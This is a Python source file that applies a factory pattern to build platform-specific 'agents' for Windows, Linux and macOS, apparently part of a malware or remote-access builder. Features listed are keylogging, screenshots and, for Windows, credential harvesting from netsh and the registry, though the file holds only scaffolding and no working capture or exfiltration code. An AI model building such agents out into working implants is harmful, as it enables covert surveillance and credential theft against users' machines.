"""
Agent Factory - FACTORY PATTERN

Creates different types of agents based on platform.

Why Factory Pattern?
- Centralizes agent creation logic
- Easy to add new platforms
- Hides complexity from caller

Usage:
    factory = AgentFactory()
    agent = factory.create_agent(
        platform="windows",
        features=["keylogger", "screenshot"]
    )
"""

from abc import ABC, abstractmethod
from typing import List, Dict
import os


class AgentBase(ABC):
    """
    Abstract base class for all agents.
    
    All platform-specific agents inherit from this.
    Defines the interface that all agents must implement.
    """
    
    def __init__(self):
        self.platform = None
        self.features = []
        self.template_path = None
    
    @abstractmethod
    def get_template(self) -> str:
        """
        Get the base template for this agent.
        
        Returns: Path to template file
        """
        pass
    
    @abstractmethod
    def get_feature_modules(self) -> List[str]:
        """
        Get available feature modules for this platform.
        
        Returns: List of feature module names
        """
        pass
    
    def add_feature(self, feature: str):
        """Add a feature to this agent"""
        if feature in self.get_feature_modules():
            self.features.append(feature)
    
    def remove_feature(self, feature: str):
        """Remove a feature from this agent"""
        if feature in self.features:
            self.features.remove(feature)


class WindowsAgent(AgentBase):
    """
    Windows-specific agent implementation.
    
    Supports:
    - Keylogger (using pynput)
    - Screenshot (using Pillow)
    - Credential harvesting (netsh, registry)
    """
    
    def __init__(self):
        super().__init__()
        from pathlib import Path
        
        self.platform = "windows"
        PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
        self.template_path = str(PROJECT_ROOT / "agents" / "templates" / "base_agent.py.template")
    
    def get_template(self) -> str:
        """Get Windows agent template"""
        return self.template_path
    
    def get_feature_modules(self) -> List[str]:
        """Available features for Windows"""
        return [
            "keylogger",
            "screenshot",
            "credentials"
        ]


class LinuxAgent(AgentBase):
    """
    Linux-specific agent implementation.
    
    Supports:
    - Keylogger (using pynput)
    - Screenshot (using Pillow)
    """
    
    def __init__(self):
        super().__init__()
        from pathlib import Path
        
        self.platform = "linux"
        PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
        self.template_path = str(PROJECT_ROOT / "agents" / "templates" / "base_agent.py.template")
    
    def get_template(self) -> str:
        """Get Linux agent template"""
        return self.template_path
    
    def get_feature_modules(self) -> List[str]:
        """Available features for Linux"""
        return [
            "keylogger",
            "screenshot"
        ]


class MacOSAgent(AgentBase):
    """
    macOS-specific agent implementation.
    
    Supports:
    - Keylogger (using pynput)
    - Screenshot (using Pillow)
    """
    
    def __init__(self):
        super().__init__()
        from pathlib import Path
        
        self.platform = "macos"
        PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
        self.template_path = str(PROJECT_ROOT / "agents" / "templates" / "base_agent.py.template")
    
    def get_template(self) -> str:
        """Get macOS agent template"""
        return self.template_path
    
    def get_feature_modules(self) -> List[str]:
        """Available features for macOS"""
        return [
            "keylogger",
            "screenshot"
        ]


class AgentFactory:
    """
    Factory class for creating agents.
    
    This is the main entry point for agent creation.
    
    Example:
        factory = AgentFactory()
        agent = factory.create_agent("windows", ["keylogger", "screenshot"])
    """
    
    @staticmethod
    def create_agent(platform: str, features: List[str] = None) -> AgentBase:
        """
        Create an agent for the specified platform.
        
        Args:
            platform: Target platform ('windows', 'linux', 'macos')
            features: List of features to include (optional)
        
        Returns:
            AgentBase instance configured for the platform
        
        Raises:
            ValueError: If platform is not supported
        """
        
        # Create platform-specific agent
        platform_lower = platform.lower()
        
        if platform_lower == "windows":
            agent = WindowsAgent()
        elif platform_lower == "linux":
            agent = LinuxAgent()
        elif platform_lower == "macos":
            agent = MacOSAgent()
        else:
            raise ValueError(f"Unsupported platform: {platform}")
        
        # Add requested features
        if features:
            for feature in features:
                if feature in agent.get_feature_modules():
                    agent.add_feature(feature)
        
        return agent
    
    @staticmethod
    def get_supported_platforms() -> List[str]:
        """Get list of supported platforms"""
        return ["windows", "linux", "macos"]
    
    @staticmethod
    def get_features_for_platform(platform: str) -> List[str]:
        """
        Get available features for a platform.
        
        Useful for displaying in UI.
        """
        agent = AgentFactory.create_agent(platform)
        return agent.get_feature_modules()